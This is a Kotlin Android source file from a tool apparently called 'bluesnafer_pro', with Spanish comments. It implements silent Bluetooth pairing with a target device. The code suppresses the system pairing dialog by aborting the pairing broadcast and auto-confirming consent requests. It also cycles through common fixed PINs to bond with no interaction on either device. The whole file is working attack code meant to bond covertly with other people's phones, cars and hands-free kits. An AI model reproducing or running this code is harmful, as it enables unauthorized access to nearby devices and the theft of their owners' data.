package com.bluesnafer_pro

import android.bluetooth.BluetoothDevice
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Emparejamiento silencioso (sin diálogo en ninguna pantalla).
 *
 * Técnicas reales, por orden de probabilidad de éxito:
 *  1. Consent/JustWorks (variante 3): setPairingConfirmation(true) al vuelo.
 *     Silencioso en Android antiguo o con privilegios; en versiones recientes
 *     lanza SecurityException (requiere BLUETOOTH_PRIVILEGED) y se reporta.
 *  2. PIN legacy (PAIRING_VARIANT_PIN): dispositivos con PIN fijo (0000/1234…),
 *     típico de manos libres/coches/feature phones. setPin() es API pública sin
 *     privilegios: bonding sin interacción en ninguno de los dos extremos.
 *  3. Passkey SSP: se intenta auto-confirmar; si el SO lo bloquea queda
 *     documentado como no-silencioso.
 *
 * El receptor se registra ANTES de createBond() con prioridad máxima sobre la
 * acción ordenada ACTION_PAIRING_REQUEST y llama abortBroadcast() para suprimir
 * el diálogo del sistema.
 */
object SilentPairing {
    private const val TAG = "SilentPairing"

    private val COMMON_PINS = listOf("0000", "1234", "1111", "1212", "7777", "1004", "123456")

    fun attempt(context: Context, device: BluetoothDevice, timeoutSec: Int = 18): Map<String, Any> {
        BluesnaferLogger.i(TAG, "Intento de emparejamiento SILENCIOSO con ${device.address}")

        if (device.bondState == BluetoothDevice.BOND_BONDED) {
            return mapOf(
                "success" to true,
                "silent" to true,
                "method" to "already_bonded",
                "message" to "El objetivo ya estaba emparejado"
            )
        }

        val usedMethod = arrayOfNulls<String>(1)
        val latch = CountDownLatch(1)

        val receiver = object : BroadcastReceiver() {
            private fun injectCommonPins(dev: BluetoothDevice) {
                for (pin in COMMON_PINS) {
                    try {
                        if (dev.setPin(pin.toByteArray(Charsets.US_ASCII))) {
                            usedMethod[0] = "pin:$pin"
                            BluesnaferLogger.i(TAG, "PIN inyectado: $pin")
                            return
                        }
                    } catch (_: Exception) {}
                }
            }

            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action != BluetoothDevice.ACTION_PAIRING_REQUEST) return
                @Suppress("DEPRECATION")
                val reqDevice = intent.getParcelableExtra<BluetoothDevice>(BluetoothDevice.EXTRA_DEVICE)
                if (reqDevice?.address != device.address) return

                abortBroadcast() // Suprimir el diálogo del sistema

                val variant = intent.getIntExtra(BluetoothDevice.EXTRA_PAIRING_VARIANT, -1)
                BluesnaferLogger.d(TAG, "PAIRING_REQUEST variante=$variant")

                when (variant) {
                    3 -> { // Consent / Just Works (sin MITM)
                        try {
                            if (device.setPairingConfirmation(true)) {
                                usedMethod[0] = "consent_autoconfirmed"
                                BluesnaferLogger.i(TAG, "Consentimiento auto-confirmado (silencioso)")
                            } else {
                                usedMethod[0] = "consent_denied_by_os"
                            }
                        } catch (e: SecurityException) {
                            usedMethod[0] = "consent_requires_privileged"
                            BluesnaferLogger.w(TAG, "setPairingConfirmation bloqueada: ${e.message}")
                        }
                    }
                    BluetoothDevice.PAIRING_VARIANT_PIN -> { // PIN legacy puro
                        injectCommonPins(device)
                        if (usedMethod[0] == null) usedMethod[0] = "pin_rejected"
                    }
                    else -> { // Passkey confirmation SSP y variantes exóticas
                        var done = false
                        try {
                            if (device.setPairingConfirmation(true)) {
                                usedMethod[0] = "passkey_autoconfirmed"
                                done = true
                            }
                        } catch (_: SecurityException) {}
                        if (!done) {
                            injectCommonPins(device)
                            if (usedMethod[0] == null) usedMethod[0] = "passkey_needs_user(variant=$variant)"
                        }
                    }
                }

                if (device.bondState == BluetoothDevice.BOND_BONDED) latch.countDown()
            }
        }


        val filter = IntentFilter(BluetoothDevice.ACTION_PAIRING_REQUEST)
        filter.priority = IntentFilter.SYSTEM_HIGH_PRIORITY - 1

        val registered = try {
            if (Build.VERSION.SDK_INT >= 33) {
                context.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                context.registerReceiver(receiver, filter)
            }
            true
        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "No se pudo registrar receptor: ${e.message}")
            false
        }

        if (!registered) {
            return mapOf(
                "success" to false,
                "silent" to false,
                "method" to "receiver_error",
                "error" to "no se pudo registrar el receptor de pairing"
            )
        }

        try {
            val createResult = try {
                device.createBond()
            } catch (e: Exception) {
                return mapOf(
                    "success" to false,
                    "silent" to false,
                    "method" to "createBond_error",
                    "error" to (e.message ?: "unknown")
                )
            }

            if (!createResult) {
                return mapOf(
                    "success" to false,
                    "silent" to false,
                    "method" to "createBond_false",
                    "error" to "createBond devolvio false (stack ocupado o ya emparejando)"
                )
            }

            latch.await(timeoutSec.toLong(), TimeUnit.SECONDS)

            val bonded = device.bondState == BluetoothDevice.BOND_BONDED
            val method = usedMethod[0] ?: if (bonded) "just_works_silent" else "no_pairing_request"
            val silent = bonded && !method.contains("needs_user") && !method.contains("privileged")

            val message = when {
                bonded && method.startsWith("pin:") ->
                    "Emparejado SILENCIOSAMENTE via PIN ${method.substringAfter(":")}"
                bonded -> "Emparejado silenciosamente ($method)"
                method.contains("needs_user") ->
                    "El objetivo exige confirmacion numerica en su pantalla (no evadible por software)"
                method.contains("privileged") ->
                    "Android moderno bloquea la auto-confirmacion sin privilegio de sistema"
                else -> "No se completo el emparejamiento en ${timeoutSec}s"
            }

            return mapOf(
                "success" to bonded,
                "silent" to silent,
                "method" to method,
                "message" to message,
                "cve" to "SILENT-PAIRING",
                "severity" to "HIGH"
            )
        } finally {
            try { context.unregisterReceiver(receiver) } catch (_: Exception) {}
        }
    }
}
